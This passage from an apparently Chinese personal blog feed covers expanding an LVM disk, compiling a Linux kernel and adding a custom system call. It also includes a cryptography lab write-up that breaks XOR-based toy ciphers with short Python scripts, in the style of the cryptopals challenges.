      894M     0  894M   0% /dev<br>tmpfs                    910M     0  910M   0% /dev/shm<br>tmpfs                    910M   11M  900M   2% /run<br>tmpfs                    910M     0  910M   0% /sys/fs/cgroup<br>/dev/mapper/centos-root   37G   21G   17G  55% /<br>/dev/sda1               1014M  313M  702M  31% /boot<br>tmpfs                    182M  4.0K  182M   1% /run/user/42<br>tmpfs                    182M   24K  182M   1% /run/user/1000<br>/dev/sr0                 8.1G  8.1G     0 100% /run/media/admin/CentOS 7 x86_64<br>tmpfs                    182M     0  182M   0% /run/user/0<br><br></code></pre></td></tr></table></figure><p>从以上信息我们可以看出，centos就是root所在的组名，输入指令增加卷组容量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vgextend centos /dev/sda3<br></code></pre></td></tr></table></figure><p><strong>查看可扩展空间大小并扩充磁盘空间：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">[admin@localhost ~]$ sudo vgdisplay <br>[sudo] password <span class="hljs-keyword">for</span> admin: <br>  --- Volume group ---<br>  VG Name               centos<br>  System ID             <br>  Format                lvm2<br>  Metadata Areas        2<br>  Metadata Sequence No  5<br>  VG Access             <span class="hljs-built_in">read</span>/write<br>  VG Status             resizable<br>  MAX LV                0<br>  Cur LV                2<br>  Open LV               2<br>  Max PV                0<br>  Cur PV                2<br>  Act PV                2<br>  VG Size               38.99 GiB<br>  PE Size               4.00 MiB<br>  Total PE              9982<br>  Alloc PE / Size       9958 / &lt;38.90 GiB<br>  Free  PE / Size       24 / 96.00 MiB<br>  VG UUID               IW5x2l-MRIe-AbnO-u110-wmFr-QCJj-DwN41a<br><br></code></pre></td></tr></table></figure><p>正常未扩容之前Free  PE &#x2F; Size应该很大，由于我是先进行了扩容后写的博客，这里没法展示之前原本的数据。</p><p><strong>扩充磁盘空间：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo lvextend -L+20G /dev/mapper/vg_test001-lv_root /dev/sda3<br></code></pre></td></tr></table></figure><p>上面的20G就是我们扩容的容量，最大不应当超过Free  PE &#x2F; Size的值。</p><p><strong>增大或者收缩未加载的文件系统的大小：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[admin@localhost ~]$ sudo <span class="hljs-built_in">df</span> -hT<br>[sudo] password <span class="hljs-keyword">for</span> admin: <br>Filesystem              Type      Size  Used Avail Use% Mounted on<br>devtmpfs                devtmpfs  894M     0  894M   0% /dev<br>tmpfs                   tmpfs     910M     0  910M   0% /dev/shm<br>tmpfs                   tmpfs     910M   11M  900M   2% /run<br>tmpfs                   tmpfs     910M     0  910M   0% /sys/fs/cgroup<br>/dev/mapper/centos-root xfs        37G   21G   17G  55% /<br>/dev/sda1               xfs      1014M  313M  702M  31% /boot<br>tmpfs                   tmpfs     182M  4.0K  182M   1% /run/user/42<br>tmpfs                   tmpfs     182M   24K  182M   1% /run/user/1000<br>/dev/sr0                iso9660   8.1G  8.1G     0 100% /run/media/admin/CentOS 7 x86_64<br>tmpfs                   tmpfs     182M     0  182M   0% /run/user/0<br><br></code></pre></td></tr></table></figure><p>可以看出&#x2F;dev&#x2F;mapper&#x2F;centos-root是xfs类型的</p><p>文件扩充：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo xfs_growfs /dev/mapper/centos-root<br></code></pre></td></tr></table></figure><p>至此所有的步骤完成，扩容成功，如果中间出了什么错误，自行百度谷歌即可。</p><h3 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h3><p>进入到源码解压的目录下，依次执行如下命令开始内核编译，这可能需要几个小时的时间，可以写一个简单的shell脚本自动执行这些编译指令即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">make bzImage<br>make modules<br>make<br>make modules_install<br>make install<br></code></pre></td></tr></table></figure><p>这里最后一步make install之后我这里报了一个错误：</p><p>dracut[38489]: Failed to install module libnvdimmvmxnet3</p><p>目测是一个模块安装错误，但是重启后发现内核已经编译安装成功了，可以正常使用：</p><p><img src="/images/linux-k5.png"></p><p>图中4.17.11内核就是我们新编译安装的。</p><p>但是，刚才为什么会报错呢？百度毫无疑问无解，我们直接谷歌，发现谷歌上有很多提问，相关内容也不多，于是改变思路，直接搜索未安装成功的libnvdimmvmxnet3模块，然后找到了答案。原来这是vm虚拟机的一个模块，emmmmm突然发现好像自己并没有解决这个问题。。。等我找出来原因在写</p><h2 id="增加一个自定义的系统调用"><a href="#增加一个自定义的系统调用" class="headerlink" title="增加一个自定义的系统调用"></a>增加一个自定义的系统调用</h2><h3 id="1-踩坑合集-4-17-11版本内核勿看"><a href="#1-踩坑合集-4-17-11版本内核勿看" class="headerlink" title="1.踩坑合集(4.17.11版本内核勿看)"></a>1.踩坑合集(4.17.11版本内核勿看)</h3><p><strong>俗话说尽信书则不如无书，照着实验手册来做，忽然发现做出来的有问题，先记录一下这些有问题的</strong></p><h4 id="1-1加系统调用号："><a href="#1-1加系统调用号：" class="headerlink" title="1.1加系统调用号："></a>1.1加系统调用号：</h4><p>先进入源代码根目录，也就是你安装的的内核的目录。在系统调用入口表中增加一项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">arch</span>/x86/entry/syscalls/<br>vi syscall_64.tbl<br></code></pre></td></tr></table></figure><p>在文件末端增加自己的系统调用函数以及对应的系统调用编号，注意不要覆盖原有的系统调用（333号为本文增加的）</p><p><img src="/images/linux-k6.png"></p><p>这个时候其实已经感觉有点不对了，看看前面的系统调用号，明显和自己加的不一样。</p><h4 id="1-2-声明系统调用函数"><a href="#1-2-声明系统调用函数" class="headerlink" title="1.2 声明系统调用函数"></a>1.2 声明系统调用函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> include/linux/<br><br>vi syscalls.h<br></code></pre></td></tr></table></figure><p>在末端加入系统调用函数的声明：</p><p><img src="/images/linux-k7.png"></p><h4 id="1-3实现系统调用函数"><a href="#1-3实现系统调用函数" class="headerlink" title="1.3实现系统调用函数"></a>1.3实现系统调用函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi kernel/sys.c<br></code></pre></td></tr></table></figure><p>在文件末端加入对应的实现函数：</p><p><img src="/images/linux-k8.png"></p><h4 id="1-4编译安装内核同上，然后重启系统选择编译好的内核。"><a href="#1-4编译安装内核同上，然后重启系统选择编译好的内核。" class="headerlink" title="1.4编译安装内核同上，然后重启系统选择编译好的内核。"></a>1.4编译安装内核同上，然后重启系统选择编译好的内核。</h4><p>首先编写相应代码测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi mysys.c<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ret = %d\n&quot;</span>,syscall(<span class="hljs-number">333</span>,i));<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译运行后，查看函数是否加入我们的内核：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/kallsyms | grep mysyscall<br></code></pre></td></tr></table></figure><p>结果是：000000000000000     T       sys_mysyscall</p><p>我们可以看到，自己编译的函数成功加入到内核，然后我们执行测试代码，然后用dmesg查看内核输出信息：</p><p><img src="/images/linux-k9.png"></p><p><img src="/images/linux-k10.png"></p><p>可以看出可以调用也正常加入了内核，但是参数明显不对，传参出现了错误！</p><h3 id="2-正确做法（4-17-11版本及以上内核）"><a href="#2-正确做法（4-17-11版本及以上内核）" class="headerlink" title="2.正确做法（4.17.11版本及以上内核）"></a>2.正确做法（4.17.11版本及以上内核）</h3><h4 id="2-1加系统调用号："><a href="#2-1加系统调用号：" class="headerlink" title="2.1加系统调用号："></a>2.1加系统调用号：</h4><p>先进入源代码根目录，在系统调用入口表中增加一项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">arch</span>/x86/entry/syscalls/<br>vi syscall_64.tbl<br></code></pre></td></tr></table></figure><p>在文件末端增加自己的系统调用函数以及对应的系统调用编号，注意不要覆盖原有的系统调用（333号为本文增加的）</p><p><img src="/images/linux-k11.png"></p><h4 id="2-2-声明系统调用函数"><a href="#2-2-声明系统调用函数" class="headerlink" title="2.2 声明系统调用函数"></a>2.2 声明系统调用函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> include/linux/<br><br>vi syscalls.h<br></code></pre></td></tr></table></figure><p>在末端加入系统调用函数的声明：</p><p><img src="/images/linux-k7.png"></p><h4 id="2-3实现系统调用函数"><a href="#2-3实现系统调用函数" class="headerlink" title="2.3实现系统调用函数"></a>2.3实现系统调用函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi kernel/sys.c<br></code></pre></td></tr></table></figure><p>在文件末端加入对应的实现函数：</p><p><img src="/images/linux-k12.png"></p><h4 id="2-4编译安装内核同上，然后重启系统选择编译好的内核。"><a href="#2-4编译安装内核同上，然后重启系统选择编译好的内核。" class="headerlink" title="2.4编译安装内核同上，然后重启系统选择编译好的内核。"></a>2.4编译安装内核同上，然后重启系统选择编译好的内核。</h4><p>首先编写相应代码测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi mysys.c<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ret = %d\n&quot;</span>,syscall(<span class="hljs-number">333</span>,i));<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译运行后，查看函数是否加入我们的内核：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/kallsyms | grep mysyscall<br></code></pre></td></tr></table></figure><p>结果是：000000000000000     T       sys_mysyscall</p><p>我们可以看到，自己编译的函数成功加入到内核，然后我们执行测试代码，然后用dmesg查看内核输出信息：</p><p><img src="/images/linux-k9.png"></p><p><img src="/images/linux-k13.png"></p><p>至此问题解决，成功增加了一个自己的系统调用!</p><p>欢迎大家批评指正！</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学实验一</title>
    <link href="/blog/2019/10/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
    <url>/blog/2019/10/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>密码学实验一做完了，写篇博客总结一下。</p><p><img src="/images/fj22.jpg"></p><span id="more"></span><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><strong>1.让我们看看流密码多次使用时出了什么问题。以下是十一个十六进制编码的密文，这些密文是使用流密文加密所有十一个具有相同流密文密钥的明文的结果。目标是解密最后的密文。提示：对密文进行异或运算，并考虑将空格与[a-zA-Z]中的字符进行异或运算时会发生什么。</strong><br><strong>2.编写一个程序破解一个类似于维吉尼亚密码加密的字符串，与维吉尼亚不同的是该加密方案使用的是字节异或而不是模26。</strong><br><strong>3.加密挑战赛</strong><br>3.1将十六进制转换为base64<br>3.2两个十六进制表示的字符串的异或<br>3.3解密经过一个字符异或加密后的数据，采用累计得分的方式<br>3.4 3.3的加强版，在n行的文件中找出经过一个字符异或加密的一行，并给出明文<br>3.5 使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串<br>3.6解密通过重复密钥异或加密后并且经过base64处理的数据<br><strong>4.通过社会工程学，猜测用户口令，破解SHA1处理后的字符串</strong></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h2><h3 id="1-流密码多次使用"><a href="#1-流密码多次使用" class="headerlink" title="1.流密码多次使用"></a>1.流密码多次使用</h3><p>[A-Z]用[0x41-0x5a]表示。相应地，[a-z]用[0x61-0x7a]表示。而空格，则用0x20表示，也就是表格中的SP。空格这个表示带来了一个很巧妙的转换：如果一个大写字母与空格与或，那么结果为一个对应的小写字母；如果一个小写字母与空格与或，那么结果为一个对应的大写字母！举两个例子：   a ^ SP &#x3D; 01100001 ^ 00100000 &#x3D; 01000001 &#x3D;   A   A ^ SP &#x3D; a ^ SP ^ SP &#x3D; a   同时，解密过程中也用到了xor的另一个性质：对于一个数，连续与或两次任意相同的数，其结果与原数相同。用公式表示就是，对于任意的x和y：   x ^ y ^ y &#x3D; x   根据提示，每一个ciphertext都是用相同的streamcipher加密的。因此，假设plaintext分别为m1、m2，那么c1 &#x3D; m1 ^   k， c2 &#x3D; m2 ^ k，于是c1 ^ c2&#x3D; m1   ^ k ^ m2 ^ k &#x3D; m1 ^ m2。这样我们就把k消去，只剩下了m1和m2。   那么，我们的解法就很显然了：随便找任意给定的m_i，m_j相与或，如果发现了有意义的英文字母，那么对应位上很可能一个是空格，另一个是英文字母 </p><p>代码运行结果如下图：</p><p><img src="/images/crypto1-1.png"></p><h3 id="2-维吉尼亚密码破解"><a href="#2-维吉尼亚密码破解" class="headerlink" title="2.维吉尼亚密码破解"></a>2.维吉尼亚密码破解</h3><p>首先我们要确定密钥的长度，从0-255循环遍历，查看哪个长度对应的可见字符数量最多。   从图中可以看出，当keysize&#x3D;7的时候有解的可能性最大 :</p><p><img src="/images/crypto1-2.png"></p><p>于是我们可以猜测密钥长度就是7，接下来我们猜测具体的密钥，从0-255循环与密文异或，如果是大小写字母或者空格逗号之类的，那么就计数+1，找到可以解密所有的字符的口令后返回：</p><p><img src="/images/crypto1-3.png"></p><p>最后发现密钥就是：[[186], [31], [145], [178], [83], [205], [62]]   然后用密钥解密原文就得到了明文： </p><p><img src="/images/crypto1-4.png"></p><h3 id="3-加密挑战赛"><a href="#3-加密挑战赛" class="headerlink" title="3.加密挑战赛"></a>3.加密挑战赛</h3><h4 id="3-1将16进制字符串转化为base64"><a href="#3-1将16进制字符串转化为base64" class="headerlink" title="3.1将16进制字符串转化为base64"></a>3.1将16进制字符串转化为base64</h4><p>代码很简单，调用相关函数即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hexToBase64</span>(<span class="hljs-params">s</span>):<br>    decoded = binascii.unhexlify(s)<br>    <span class="hljs-keyword">return</span> base64.b64encode(decoded).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><br>x = <span class="hljs-string">&#x27;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&#x27;</span><br>expectedY = <span class="hljs-string">&#x27;SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t&#x27;</span><br>y = hexToBase64(x)<br><span class="hljs-built_in">print</span>(y)<br><span class="hljs-built_in">print</span>(expectedY)<br><br><br></code></pre></td></tr></table></figure><p>结果如下：</p><p>SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t<br>SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t</p><h4 id="3-2十六进制表示的字符串的异或"><a href="#3-2十六进制表示的字符串的异或" class="headerlink" title="3.2十六进制表示的字符串的异或"></a>3.2十六进制表示的字符串的异或</h4><p>先将十六进制字符串转换成字符串，然后调用strxor函数即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><br>encodedS = <span class="hljs-string">&#x27;1c0111001f010100061a024b53535009181c&#x27;</span><br>encodedT = <span class="hljs-string">&#x27;686974207468652062756c6c277320657965&#x27;</span><br>encodedExpectedU = <span class="hljs-string">&#x27;746865206b696420646f6e277420706c6179&#x27;</span><br><br>s = binascii.unhexlify(encodedS)<br>t = binascii.unhexlify(encodedT)<br>expectedU = binascii.unhexlify(encodedExpectedU)<br><br>u = strxor(s, t)<br><span class="hljs-built_in">print</span>(u)<br><span class="hljs-built_in">print</span>(expectedU)<br></code></pre></td></tr></table></figure><p>运行结果：</p><p>b”the kid don’t play”<br>b”the kid don’t play”</p><h4 id="3-3解密经过一个字符异或加密后的数据，采用累计得分的方式"><a href="#3-3解密经过一个字符异或加密后的数据，采用累计得分的方式" class="headerlink" title="3.3解密经过一个字符异或加密后的数据，采用累计得分的方式"></a>3.3解密经过一个字符异或加密后的数据，采用累计得分的方式</h4><p>首先查找一下英文词频，以便于后面的赋值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">freqs = &#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">0.0651738</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">0.0124248</span>,<br>    <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">0.0217339</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">0.0349835</span>,<br>    <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-number">0.1041442</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-number">0.0197881</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-number">0.0158610</span>,<br>    <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-number">0.0492888</span>,<br>    <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-number">0.0558094</span>,<br>    <span class="hljs-string">&#x27;j&#x27;</span>: <span class="hljs-number">0.0009033</span>,<br>    <span class="hljs-string">&#x27;k&#x27;</span>: <span class="hljs-number">0.0050529</span>,<br>    <span class="hljs-string">&#x27;l&#x27;</span>: <span class="hljs-number">0.0331490</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span>: <span class="hljs-number">0.0202124</span>,<br>    <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-number">0.0564513</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span>: <span class="hljs-number">0.0596302</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-number">0.0137645</span>,<br>    <span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-number">0.0008606</span>,<br>    <span class="hljs-string">&#x27;r&#x27;</span>: <span class="hljs-number">0.0497563</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">0.0515760</span>,<br>    <span class="hljs-string">&#x27;t&#x27;</span>: <span class="hljs-number">0.0729357</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-number">0.0225134</span>,<br>    <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-number">0.0082903</span>,<br>    <span class="hljs-string">&#x27;w&#x27;</span>: <span class="hljs-number">0.0171272</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-number">0.0013692</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span>: <span class="hljs-number">0.0145984</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-number">0.0007836</span>,<br>    <span class="hljs-string">&#x27; &#x27;</span>: <span class="hljs-number">0.1918182</span> <br>&#125;<br></code></pre></td></tr></table></figure><p>然后编写赋分函数，这里大写字母全部映射到小写计算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">scoring</span>(<span class="hljs-params">s</span>):<br>    score = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        c = <span class="hljs-built_in">chr</span>(i).lower()<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> freqs:<br>            score += freqs[c]<br>    <span class="hljs-keyword">return</span> score<br><br></code></pre></td></tr></table></figure><p>   剩下的就是从0-255试密钥了，将得分值最高的密钥返回，认定为最有可能的密钥   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">breakSingleByteXOR</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">p</span>):<br>        <span class="hljs-comment">#print(p)</span><br>        <span class="hljs-keyword">return</span> scoring(p[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>([(i, strxor_c(s, i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>)], key=key)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    encodedS = <span class="hljs-string">&#x27;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736&#x27;</span><br>    s = binascii.unhexlify(encodedS)<br>    <span class="hljs-built_in">print</span>(breakSingleByteXOR(s))<br></code></pre></td></tr></table></figure><p>最后的解密结果就是：</p><p>(88, b”Cooking MC’s like a pound of bacon”)</p><p>密钥就是88，明文是 Cooking MC’s like a pound of bacon</p><h4 id="3-4-3-3的加强版，在文件中找出经过一个字符异或加密的一行，并给出明文"><a href="#3-4-3-3的加强版，在文件中找出经过一个字符异或加密的一行，并给出明文" class="headerlink" title="3.4 3.3的加强版，在文件中找出经过一个字符异或加密的一行，并给出明文"></a>3.4 3.3的加强版，在文件中找出经过一个字符异或加密的一行，并给出明文</h4><p>这题和上面那题一样，只不过从一行变成n行而已，我们只需将上面那题循环n次即可，找出n行中得分最高的一行和对应的密钥即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> challenge3<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decodeLines</span>(<span class="hljs-params">filename</span>):<br>    f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-keyword">if</span> line[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\n&#x27;</span>:<br>            line = line[:-<span class="hljs-number">1</span>]<br>        s = binascii.unhexlify(line)<br>        <span class="hljs-keyword">yield</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findSingleByteXOR</span>(<span class="hljs-params">lines</span>):<br>    brokenLines = [challenge3.breakSingleByteXOR(l)[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> lines]<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scoring</span>(<span class="hljs-params">i</span>):<br>        <span class="hljs-keyword">return</span> challenge3.scoring(brokenLines[i])<br>    maxI = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(brokenLines)), key=scoring)<br>    <span class="hljs-keyword">return</span> (maxI+<span class="hljs-number">1</span>, brokenLines[maxI])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(findSingleByteXOR(decodeLines(<span class="hljs-string">&#x27;challenge4.txt&#x27;</span>)))<br></code></pre></td></tr></table></figure><p>结果如下：</p><p>(171, b’Now that the party is jumping\n’)</p><p>第171行是经过单字符加密的口令，解密结果就是Now that the party is jumping</p><h4 id="3-5使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串"><a href="#3-5使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串" class="headerlink" 